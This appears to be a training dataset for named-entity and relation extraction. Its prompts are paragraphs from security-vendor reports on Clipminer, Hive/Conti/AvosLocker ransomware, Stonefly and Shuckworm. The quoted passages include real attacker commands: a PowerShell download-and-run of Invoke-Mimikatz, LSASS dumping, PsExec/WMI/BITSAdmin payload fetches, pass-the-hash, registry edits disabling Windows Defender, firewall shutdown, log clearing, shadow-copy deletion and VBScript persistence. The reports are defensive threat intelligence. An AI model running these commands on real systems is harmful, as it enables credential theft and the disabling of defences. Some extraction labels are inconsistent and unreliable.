{"instruction": "Note that the above are v2 Onion Services. In 2021, v2 Onion Services were depreciated and are no longer supported by current versions of Tor. However, many nodes on the Tor network have yet to be upgraded, meaning the services are still reachable. The received response is roughly 10 MB in size and contains the Clipminer payload, which is used to perform coin mining and clipboard hijacking on the compromised computer. The payload is stored in the following location: [EXISTING_TOP_DIRECTORY]\\[VARIABLE]\\[VARIABLE]\\ Where [EXISTING_TOP_DIRECTORY] is one of the following: C:\\Program Files (x86)\\ C:\\Program Files (x86)\\Common Files\\ C:\\ProgramData\\ [USERPROFILE]\\AppData\\Local\\ The following is an example of the location and directory naming convention used by the malware: C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\\ It also populates the two newly created directories with files copied from the local machine so that the malicious files are less likely to stand out.", "input": null, "output": "Named Entities: (Tor, tool), (Clipminer, malware)\nRelationships: (Clipminer, payload, clipboard hijacking), (Clipminer, payload, coin mining)"}
{"instruction": "It then drops the load point to the inner directory, where file hash, file directory, and file name vary: f49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b rhnoiniye_ni.dll (Packed load point) Then it creates scheduled tasks (similar to the following examples) to execute the load point for persistence (details vary between runs): URI: \\Microsoft\\Windows\\Active Directory Rights Management Services Client\\Microc040e Actions: Exec Command: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe Arguments: /u \"C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\\imsgt_dvepr.dll\" WorkingDirectory: C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices It creates the following empty registry key (likely as an infection marker): HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\[VARYING_UUID_FORMAT] For example: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{19C316FE-770F-426C-9B63-F76C34154769} The loaded payload starts a v3 Onion Service (the address changes per infection). We also observed traces of another v3 Onion Service (possibly used to ping the attackers whenever the compromised machine comes online). The payload will monitor keyboard and mouse activity to determine if the machine is in use. It also appears to monitor running processes, checking for analysis/troubleshooting tools.", "input": null, "output": "Named Entities: (f49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b, SHA256), (rhnoiniye_ni.dll, file)\nRelationships: (rhnoiniye_ni.dll, hash, f49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b)"}
{"instruction": "Figure 1. Clipminer monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers Figure 2. Clipminer gains control of the computer\u2019s clipboard and replaces cryptocurrency addresses with ones controlled by the attackers Samples of the Clipminer malware began to appear around January 2021, with the cryptocurrency wallets used by the malware\u2019s operators seeing activity begin in February of the same year. This is just a few months after KryptoCibule was uncovered and blogged about by ESET researchers. While we cannot confirm if Clipminer and KryptoCibule are one and the same, the design similarities are striking. It is possible that following the exposure from ESET\u2019s blog, the KryptoCibule actors may have decided to switch things up and launched Clipminer. Another possibility is that different threat actors may have taken inspiration from KryptoCibule and created Clipminer in its image.", "input": null, "output": "Named Entities: (Clipminer, malware), (KryptoCibule, malware)\nRelationships: (Clipminer, similar to, KryptoCibule)"}
{"instruction": "However, whatever the truth may be, one thing is clear: Clipminer has proven a successful endeavor, earning its operators a considerable amount of money.", "input": null, "output": "No related entities and relations."}
{"instruction": "Ransomware: How Attackers are Breaching Corporate Networks", "input": null, "output": "No related entities and relations."}
{"instruction": "Latest tools, tactics, and procedures being used by the Hive, Conti, and AvosLocker ransomware operations. Targeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness. Symantec, a division of Broadcom Software , tracks various ransomware threats; however, the following three ransomware families are being observed in the majority of recent attacks: Hive Conti Avoslocker", "input": null, "output": "Named Entities: (Hive, malware), (Conti, malware), (AvosLocker, malware)\nRelationships: No related entities and relations."}
{"instruction": "Similar to many other ransomware families, Hive, Conti, and Avoslocker follow the ransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware operators hire affiliates who are responsible for launching the ransomware attacks on their behalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out by the ransomware operators. Once initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a plethora of TTPs to help the operators achieve the following: Gain persistence on the network Escalate privileges Tamper with and evade security software Laterally move across the network Initial Access Affiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of techniques to gain an initial foothold on victim networks. Some of these techniques include: Spear phishing leading to the deployment of malware, including but not limited to: IcedID Emotet QakBot TrickBot", "input": null, "output": "Named Entities: (Hive, malware), (Conti, malware), (Avoslocker, malware), (RaaS, threat type), (IcedID, malware), (Emotet, malware), (QakBot, malware), (TrickBot, malware)\nRelationships: (Hive, follow, RaaS), (Conti, follow, RaaS), (Avoslocker, follow, RaaS), (malware, include, IcedID), (malware, include, Emotet), (malware, include, QakBot), (malware, include, TrickBot)"}
{"instruction": "Taking advantage of weak RDP credentials Exploiting vulnerabilities such as: Microsoft Exchange vulnerabilities - CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, CVE-2021-26855 FortiGate firewall vulnerabilities - CVE-2018-13379 and CVE-2018-13374 Apache Log4j vulnerabily - CVE-2021-44228 In most cases, the spear-phishing emails contain Microsoft Word document attachments embedded with macros that lead to the installation of one of the previously mentioned malware threats. In some instances, attackers use this malware to install Cobalt Strike, which is then used to pivot to other systems on the network. These malware threats are then used to distribute ransomware onto compromised computers. Persistence After gaining initial access, Symantec has observed affiliates for all three ransomware families using third-party software such as AnyDesk and ConnectWise Control (previously known as ScreenConnect) to maintain access to victim networks. They also enable default Remote Desktop access in the firewall: netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes", "input": null, "output": "Named Entities: (CVE-2021-34473, vulnerability), (CVE-2021-34523, vulnerability), (CVE-2021-31207, vulnerability), (CVE-2021-26855, vulnerability), (CVE-2018-13379, vulnerability), (CVE-2018-13374, vulnerability), (CVE-2021-44228, vulnerability), (spear-phishing emails, tool), (Cobalt Strike, malware), (ransomware, threat type), (AnyDesk, tool), (ConnectWise Control, tool), (ScreenConnect, tool)\n\nRelationships: (malware, exploiting, CVE-2021-34473), (malware, exploiting, CVE-2021-34523), (malware, exploiting, CVE-2021-31207), (malware, exploiting, CVE-2021-26855),(malware, exploiting, CVE-2018-13379), (malware, exploiting, CVE-2018-13374), (malware, exploiting, CVE-2021-44228), (malware, install, Cobalt Strike), (affiliates, use, AnyDesk), (affiliates, use, ConnectWise Control), (ConnectWise Control, previously known as, ScreenConnect)"}
{"instruction": "Actors are also known to create additional users on compromised systems to maintain access. In some instances we have seen threat actors add registry entries that allow them to automatically log in when a machine is restarted: reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d <user> /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f Discovery During the discovery phase the ransomware actors try to sweep the victim\u2019s network to identify potential targets. Symantec has observed the aforementioned ransomware actors using tools such as the following: ADRecon - Gathers Active Directory information and generates a report Netscan - Discovers devices on the network Credential Access", "input": null, "output": "Named Entities: (Actors, attacker), (ADRecon, tool), (Netscan, tool)\nRelationships: (Actors, use, ADRecon), (Actors, use, Netscan)"}
{"instruction": "Mimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories: powershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds In addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full Adversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials. Lateral Movement", "input": null, "output": "Named Entities: (Mimikatz, tool), (Hive, tool), (Conti, tool), (Avoslocker, tool), (https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1, URL), (comsvcs.dll, file), (rundll32.exe, file), (taskmgr.exe, file)\n\nRelationships: (Mimikatz, download from, https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1), (threat actor, use, comsvcs.dll), (comsvcs.dll, dump LSASS memory, rundll32.exe), (threat actor, use, taskmgr.exe)"}
{"instruction": "Attackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute the ransomware on victim networks. We have also observed the attackers using several other techniques to laterally move across networks. PsExec psexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\\xxx.exe WMI wmic /node:@C:\\share$\\comps1.txt /user:\"user\" /password:\"password\" process call create \"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\" BITSAdmin bitsadmin /transfer debjob /download /priority normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll Mimikatz mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>\" Defense Evasion As with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper with various security products that interfere with their goal. We have observed them meddling with security services using the net, taskkill, and sc commands to disable or terminate them. In some cases they also use tools like PC Hunter", "input": null, "output": "Named Entities: (PsExec, tool), (WMI, tool), (BITSAdmin, tool), (ransomware, threat type), (Mimikatz, tool), (Hive, malware), (Conti, malware), (Avoslocker, malware)\nRelationships: (PsExec, lateral spread, ransomware), (WMI, lateral spread, ransomware), (BITSAdmin, lateral spread, ransomware), (Hive, tamper, security products), (Conti, tamper, security products), (Avoslocker, tamper, security products)"}
{"instruction": "to end processes. They have also been seen tampering with various registry entries related to security products, since changes to the registry entries can make those products inoperative. Both Hive and AvosLocker have been observed attempting to disable Windows Defender using the following reg.exe commands. AvosLocker: reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f Hive: reg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f", "input": null, "output": "Named Entities: (Hive, malware), (AvosLocker, malware), (reg.exe, file)\nRelationships: (Hive, use, reg.exe), (AvosLocker, use, reg.exe)"}
{"instruction": "reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe delete aHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\u201d /v \u201cWindows Defender\u201d /f reg.exe delete \u201cHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u201d /v \u201cWindows Defender\u201d / Disabling the default Windows firewall is also one of the techniques we have seen being used by these ransomware families: netsh advfirewall set allprofiles state off To cover their tracks on a victim system the actors may also clear the Windows event log: wevtutil.exe cl system wevtutil.exe cl security wevtutil.exe cl application", "input": null, "output": "Named Entities: (reg.exe, tool), (wevtutil.exe, file)\n\nRelationships: (actors, use, wevtutil.exe)"}
{"instruction": "powershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\" Impact Adversaries tend to disable or tamper with operating system settings in order to make it difficult for administrators to recover data. Deleting shadow copies is a common tactic threat actors perform before starting the encryption process. They perform this task by using tools like Vssadmin or WMIC and running one of the following commands: vssadmin.exe delete shadows /all /quiet wmic.exe shadowcopy delete We have also seen BCDEdit being used to disable automatic system recovery and to ignore failures on boot: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no In some instances the actors delete the safe mode settings in the registry to stop security product services from starting in safe mode: reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\<service> /f Exfiltration", "input": null, "output": "Named Entities: (Vssadmin, tool), (WMIC, tool), (vssadmin.exe, file), (wmic.exe, file), (BCDEdit, tool), (bcdedit.exe, file)\n\nRelationships: (attacker, use, Vssadmin), (attacker, use, WMIC), (Vssadmin, use, vssadmin.exe), (WMIC, use, wmic.exe), (attacker, use, BCDEdit), (BCDEdit, use, bcdedit.exe)"}
{"instruction": "Attackers commonly exfiltrate critical data from a victim\u2019s environment before encrypting it. They then use the stolen data in an attempt to extort a ransom from victims. We have observed threat actors using the following cloud services to exfiltrate data: https://anonfiles.com https://mega.nz https://send.exploit.in https://ufile.io https://www.sendspace.com We have also seen attackers use the following tools for data exfiltration: Filezilla Rclone Conclusion The TTPs outlined in this blog are a snapshot of the current ransomware threat landscape. The TTPs used by these threat actors are constantly evolving, with groups continually tweaking their methods in a bid to outmaneuver their targets\u2019 security defenses. As such, organizations need to be vigilant and employ a multi-layered security approach. Symantec Protection Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. AV Protection Ransom.Hive Ransom.Conti Ransom.AvosLocker Backdoor.Cobalt Hacktool.Mimikatz Trojan.IcedID* Trojan.Emotet* W32.Qakbot* Trojan.Trickybot* Behavioral Protection SONAR.RansomHive!g2 SONAR.RansomHive!g3 SONAR.RansomHive!g4 SONAR.RansomAvos!g2 SONAR.RansomConti!g1 SONAR.RansomConti!g3 SONAR.RansomConti!g4 SONAR.Ransomware!g30", "input": null, "output": "Named Entities: (ransomware, threat type), (https://anonfiles.com, URL), (https://mega.nz, URL), (https://send.exploit.in, URL), (https://ufile.io, URL), (https://www.sendspace.com, URL), (Filezilla Rclone, tool)\nRelationships: (attacker, use, https://anonfiles.com), (attacker, use, https://mega.nz), (attacker, use, https://send.exploit.in), (attacker, use, https://ufile.io), (attacker, use, https://www.sendspace.com), (attacker, use, Filezilla Rclone)"}
{"instruction": "SONAR.RansomGregor!g1 SONAR.SuspLaunch!gen4 SONAR.SuspLaunch!g18 SONAR.Ransom!gen59 SONAR.Ransomware!g26 SONAR.Cryptlck!g171 Intrusion Prevention System (IPS) detections IPS blocks initial access, persistence, and lateral movement. SEP's Audit Signatures are intended to raise awareness of potentially unwanted traffic on the network. By default, Audit Signatures do not block. Administrators reviewing the logs of IPS events in their network can note these Audit events and decide whether or not to configure the corresponding Audit Signatures to block the traffic. The following is a list of Audit Signatures that can be enabled to block, through policies, activity related to the use of software or tools such as AnyDesk, ScreenConnect, and PsExec. 33211 [Audit: AnyDesk Remote Desktop Activity] 33156 [Audit: ScreenConnect Remote Support Software Activity] 30068 [Audit: PSExec Utility Activity] 33588 [Audit: WMIC Remote RPC Interface Bind Attempt] 33311 [Audit: PCHunter Tool Activity] 33295 [Attack: Ransom.Conti Activity 3] 33435 [Attack: Ransom.AvosLocker Activity 3] 33444 [Attack: Ransom.AvosLocker Activity 4]", "input": null, "output": "Named Entities: (AnyDesk, tool), (ScreenConnect, tool), (PsExec, tool)\n\nRelationships: No related entities and relations."}
{"instruction": "32436 [Attack: Ransom.Gen Activity 29] 33323 [Attack: Ransom.Hive Activity] 33119 [Audit: RClone Tool Activity] Symantec recommends that you have intrusion prevention enabled on all your devices including servers. Adaptive Protection Symantec Adaptive Protection can help protect against lateral movement and ransomware execution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and BITSAdmin in your environment then you should \u201cDeny\u201d these applications and actions using Symantec Adaptive Protection policies. Recommendations Customers are advised to enable their Intrusion Prevention System (IPS) on desktops and servers for best protection. Click here for instructions on enabling the IPS Server Performance Tuning feature. This feature should be enabled on servers to allow additional tuning for the IPS module and definitions in high-throughput scenarios. Customers are also advised to enable Proactive Threat Protection, also known as SONAR , which is Symantec\u2019s behavior-based protection.", "input": null, "output": "Named Entities: (PsExec, tool), (WMIC, tool), (BITSAdmin, tool)\nRelationships: No related entities and relations."}
{"instruction": "Customers should also keep Symantec Endpoint Protection (SEP) up-to-date with the latest version and definition set. Symantec has multi-layer protection technologies for all the threat types. To provide the best protection, all SEP features should be enabled for Windows desktops and servers.", "input": null, "output": "No related entities and relations."}
{"instruction": "Stonefly: North Korea-linked Spying Operation Continues to Hit High-value Targets", "input": null, "output": "Named Entities: (Stonefly, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Espionage group focuses on obtaining classified or sensitive intellectual property that has civilian and military applications. \nThe North Korean-linked Stonefly group is continuing to mount espionage attacks against highly specialized engineering companies with a likely goal of obtaining sensitive intellectual property. \nStonefly specializes in mounting highly selective targeted attacks against targets that could yield intelligence to assist strategically important sectors such as energy, aerospace, and military equipment. Virtually all of the technologies it appears to be interested in have military as well as civilian uses and some could have applications in the development of advanced weaponry.", "input": null, "output": "Named Entities: (espionage attack, threat type), (Stonefly, attacker)\nRelationships: (Stonefly, mount, espionage attack)"}
{"instruction": "History of ambitious attacks Stonefly (aka DarkSeoul, BlackMine, Operation Troy, and Silent Chollima) first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U.S. government, and financial websites. It reappeared again in 2011 , when it launched more DDoS attacks, but also revealed an espionage element to its attacks when it was found to be using a sophisticated backdoor Trojan (Backdoor.Prioxer) against selected targets. In March 2013 , the group was linked to the Jokra (Tojan.Jokra) disk-wiping attacks against a number of South Korean banks and broadcasters. Three months later, the group was involved in a string of DDoS attacks against South Korean government websites .", "input": null, "output": "Named Entities: (Stonefly, attacker), (DarkSeoul, attacker), (BlackMine, attacker), (Operation Troy, attacker), (Silent Chollima, attacker), (DDoS, threat type), (Backdoor.Prioxer, malware), (Jokra, malware), (Tojan.Jokra, malware)\nRelationships: (Stonefly, aka, DarkSeoul), (Stonefly, aka, BlackMine), (Stonefly, aka, Operation Troy), (Stonefly, aka, Silent Chollima), (Stonefly, mount, DDoS attacks), (Stonefly, use, Backdoor.Prioxer), (Stonefly, link, Jokra)"}
{"instruction": "In recent years, the group\u2019s capabilities have grown markedly and, since at least 2019 Symantec has seen its focus shift solely to espionage operations against select, high-value targets. It now appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. Stonefly\u2019s operations appear to be part of a broader North Korean-sponsored campaign to acquire information and intellectual property, with Operation Dream Job, a more wider-ranging trawl across multiple sectors, being carried out by another North Korean group, Pompilus.", "input": null, "output": "Named Entities: (Stonefly, attacker), (Operation Dream Job, malware), (Pompilus, attacker)\nRelationships: (Operation Dream Job, carried out by, Pompilus)"}
{"instruction": "Latest target The most recent attack discovered by Symantec, a division of Broadcom Software , was against an engineering firm that works in the energy and military sectors. The attackers breached the organization in February 2022, most likely by exploiting the Log4j vulnerability (CVE-2021-44228) vulnerability on a public-facing VMware View server. The attackers then moved across the network and compromised 18 other computers. 17 hours later: Shortly after compromising the initial server, the attackers installed an updated version of Stonefly\u2019s Backdoor.Preft malware (aka Dtrack, Valefor). The attackers then used a masqueraded version (file name: pvhost.exe) of PuTTY\u2019s PSCP command line application , presumably to exfiltrate data from the infected machine. Shortly after PSCP was executed, the credential-dumping tool Mimikatz (masquerading under the file name pl.exe) was run.", "input": null, "output": "Named Entities: (CVE-2021-44228, vulnerability), (Backdoor.Preft, malware), (Dtrack, malware), (Valefor, malware), (PuTTY\u2019s PSCP command line application, tool), (pvhost.exe, file), (Mimikatz, tool), (pl.exe, file)\n\nRelationships: (attacker, exploit, CVE-2021-44228), (attackers, install, Backdoor.Preft), (Backdoor.Preft, aka, Dtrack), (Backdoor.Preft, aka, Valefor), (attackers, use, PuTTY\u2019s PSCP command line application), (PuTTY\u2019s PSCP command line application, masquerade as, pvhost.exe), (attackers, run, Mimikatz), (Mimikatz, masquerade as, pl.exe)"}
{"instruction": "Day 2 : Malicious activity resumed when 3proxy tiny proxy server , a publicly available proxy tool (file name: svhost.exe) was executed. Use of this tool continued for the next four days. A second suspected proxy tool was installed two days into this four day period (file name: tapi.exe). Several hours afterwards, a copy of the Preft backdoor (file name: svchost.exe) was installed. Two days later, WinSCP , an open-source SSH file-transfer tool was used, presumably to exfiltrate or upload data to the compromised computer. Day 3: The next phase of the intrusion began on the following day, when Preft was executed and the attackers began moving latterly across the organization\u2019s network, using Invoke-TheHash , a publicly available PowerShell pass-the-hash utility (file name: rev.ps1), and wmiexec.py, a publicly available Impacket tool used to run WMI commands (file name: notepad.exe).", "input": null, "output": "Named Entities: (3proxy tiny proxy server, tool), (svhost.exe, file), (tapi.exe, file), (Preft backdoor, malware), (svchost.exe, file), (WinSCP, tool), (Invoke-TheHash, tool), (rev.ps1, file), (wmiexec.py, tool), (notepad.exe, file)\n\nRelationships: (attacker, use, 3proxy tiny proxy server), (3proxy tiny proxy server, file, svhost.exe), (attacker, install, tapi.exe), (attacker, use, 3proxy tiny proxy server), (3proxy tiny proxy server, file, svhost.exe), (attacker, install, Preft backdoor), (Preft backdoor, file, svchost.exe), (attacker, use, WinSCP), (attacker, use, Invoke-TheHash), (Invoke-TheHash, file, rev.ps1), (attacker, use, wmiexec.py), (wmiexec.py, file, notepad.exe), "}
{"instruction": "Updated Preft backdoor The attackers used an updated version of Stonefly\u2019s custom Preft backdoor. Analysis of the backdoor revealed that it is a multistage tool: Stage 1 is the main binary. A python script is used to unpack the binary and shellcode. Stage 2 is shellcode. It performs the following actions: Sleeps for 19,999 seconds, probably in an attempt to evade sandbox detection Opens a mutex, with the name specified in the Stage 3 shellcode Instead of loading an executable file, it starts Internet Explorer (iexplore.exe) or explorer.exe and injects the Stage 3 shellcode into either. It sets up a named pipe (\"\\.\\pipe\\pipe\") for communication. The file name of the main binary is sent over the pipe. Stage 3 is more shellcode. Stage 4 is the payload. It is an HTTP remote access tool (RAT) that supports various commands, including: Download (Download a file and save locally)", "input": null, "output": "Named Entities: (Preft backdoor, malware), (Stonefly, attacker), (iexplore.exe, file), (explorer.exe, file)\nRelationships: (Preft backdoor, inject, iexplore.exe), (Preft backdoor, inject, explorer.exe)"}
{"instruction": "Upload (Upload a file to a C&C server) Set Interval (Change C&C server query interval - in minutes) Shell Execute (Execute a command in the shell) Download Plugin Update (Download a new version and replace) Info (Return debug information about the current infection) Uninstall Download Executable The malware can support four different kinds of plugins: executable files, VBS, BAT, and shellcode. It supports three different persistence modes: Startup_LNK, Service, Registry, and Task Scheduler.", "input": null, "output": "Named Entities: (C&C server, tool)\nRelationships: No related entities and relations."}
{"instruction": "Custom information stealer Along with the Preft backdoor, Stonefly also deployed what appears to be a custom developed information stealer (infostealer). Analysis of this malware revealed that it is a three-staged threat. The main binary extracts and decrypts the encrypted shellcode with a modified RC4 algorithm. Stage 2 is shellcode which retrieves the payload and decrypts it with the same modified RC4 algorithm. The decrypted payload is an executable file that is loaded in-memory. It is designed to search the infected computer for files using pre-configured parameters. These are then copied to temporary files before being copied to a single .zip file and the temporary files are removed. The ZIP file path is %TEMP/~[XXXXXXXX].tmp, where XXXXXXXX is a simple hash of the computer name (eight uppercase hex digits).", "input": null, "output": "Named Entities: (Preft backdoor, malware), (Stonefly, attacker), (infostealer, threat type)\nRelationships: (Stonefly, deploy, infostealer)"}
{"instruction": "Curiously, this ZIP file is not automatically exfiltrated. It is possible that the exfiltration functionality was removed and the attackers planned to use an alternative means of exfiltration.", "input": null, "output": "No related entities and relations."}
{"instruction": "High-value targets \nWhile Stonefly\u2019s tools and tactics continue to evolve, there are some common threads between this recent activity and previous attacks, such as its ongoing development of the Preft backdoor and heavy reliance on open-source tools. \nThe group\u2019s capabilities and its narrow focus on acquiring sensitive information make it one of the most potent North Korean cyber threat actors operating today.", "input": null, "output": "Named Entities: (Stonefly, attacker), (Preft backdoor, malware)\nRelationships: (Stonefly, develop, Preft backdoor)"}
{"instruction": "Shuckworm: Espionage Group Continues Intense Campaign Against Ukraine", "input": null, "output": "Named Entities: (Shuckworm, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Russia-linked group is continually refining its malware and often deploying multiple payloads to maximize chances of maintaining a persistent presence on targeted networks. \nThe Russian-linked Shuckworm espionage group (aka Gamaredon, Armageddon) is continuing to mount an intense cyber campaign against organizations in Ukraine. \nShuckworm has almost exclusively focused its operations on Ukraine since it first appeared in 2014. These attacks have continued unabated since the Russian invasion of the country. While the group\u2019s tools and tactics are simple and sometimes crude, the frequency and persistence of its attacks mean that it remains one of the key cyber threats facing organizations in the region.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Gamaredon, attacker), (Armageddon, attacker)\nRelationships: (Shuckworm, aka, Gamaredon), (Shuckworm,aka, Armageddon)"}
{"instruction": "Multiple payloads One of the hallmarks of the group\u2019s recent activity is the deployment of multiple malware payloads on targeted computers. These payloads are usually different variants of the same malware (Backdoor.Pterodo), designed to perform similar tasks. Each will communicate with a different command-and-control (C&C) server. The most likely reason for using multiple variants is that it may provide a rudimentary way of maintaining persistence on an infected computer. If one payload or C&C server is detected and blocked, the attackers can fall back on one of the others and roll out more new variants to compensate.", "input": null, "output": "Named Entities: (Backdoor.Pterodo, malware), (command-and-control server, tool)\nRelationships: (Backdoor.Pterodo, communicate with, command-and-control server)"}
{"instruction": "Symantec\u2019s Threat Hunter Team, part of Broadcom Software , has found four distinct variants of Pterodo being used in recent attacks. All of them are Visual Basic Script (VBS) droppers with similar functionality. They will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a C&C server. All of the embedded VBScripts were very similar to one another and used similar obfuscation techniques.", "input": null, "output": "Named Entities: (Pterodo, malware), (VBScript, tool), (Scheduled Tasks, tool), (shtasks.exe, file), (C&C server, tool)\nRelationships: (Pterodo, drop, VBScript file), (Pterodo, use, Scheduled Tasks), (Scheduled Tasks, file, shtasks.exe), (Pterodo, download, additional code), (Pterodo, use, C&C server)"}
{"instruction": "Backdoor.Pterodo.B This variant is a modified self-extracting archive, containing obfuscated VBScripts in resources that can be unpacked by 7-Zip. It then adds them as a scheduled task to ensure persistence: CreateObject(\"Shell.Application\").ShellExecute \"SCHTASKS\", \"/CREATE /sc minute /mo 10 /tn \" + \"\"\"UDPSync\"\" /tr \"\"wscript.exe \"\"\" + hailJPT + \"\"\"\" & \" jewels //b joking //e VBScript joyful \"\" /F \", \"\" , \"\" , 0 CreateObject(\"Shell.Application\").ShellExecute \"SCHTASKS\", \"/CREATE /sc minute /mo 10 /tn \" + \"\"\"SyncPlayer\"\" /tr \"\"wscript.exe \"\"\" + enormouslyAKeIXNE + \"\"\"\" + \" jewels //b joking //e VBScript joyful \"\" /F \", \"\" , \"\" , 0 The script also copies itself to [USERPROFILE]\\ntusers.ini file. The two newly created files are more obfuscated VBScripts. The first is designed to gather system information, such as the serial number of the C: drive, and sends this information to a C&C server.", "input": null, "output": "Named Entities: (Backdoor.Pterodo.B, malware), (7-Zip, tool), (C&C server, tool)\nRelationships: (Backdoor.Pterodo.B, unpacked by, 7-Zip), (Backdoor.Pterodo.B, send to, C&C server)"}
{"instruction": "The second adds another layer of persistence by copying the previously dropped ntusers.ini file to another desktop.ini file.", "input": null, "output": "Named Entities: (ntusers.ini file, file), (desktop.ini file, file)\nRelationships: (ntusers.ini file, copied to, desktop.ini file)"}
